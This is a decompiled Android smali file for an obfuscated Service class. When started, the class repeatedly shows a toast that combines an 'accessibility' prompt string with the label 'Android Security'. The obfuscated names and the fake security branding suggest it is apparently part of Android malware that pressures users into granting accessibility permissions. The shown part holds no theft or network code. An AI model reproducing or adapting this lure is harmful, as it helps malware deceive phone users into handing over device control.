.class public Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;
.super Landroid/app/Service;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Lwocwvy/czyxoxmbauu/slsa/c;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    new-instance p1, Ljava/lang/UnsupportedOperationException;

    const-string v0, "Not yet implemented"

    invoke-direct {p1, v0}, Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {p1, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->i(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    iget-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {p3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string p3, "Android Security"

    const-string v0, ""

    invoke-virtual {p3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p3

    if-nez p3, :cond_0

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string p1, "Android Security"

    :cond_0
    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/clgqtzqdh;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "StringAccessibility"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " \'"

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\'"

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 p3, 0x1

    invoke-static {p0, p1, p3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    const/16 p3, 0x10

    const/4 v0, 0x0

    invoke-virtual {p1, p3, v0, v0}, Landroid/widget/Toast;->setGravity(III)V

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    return p2
.end method
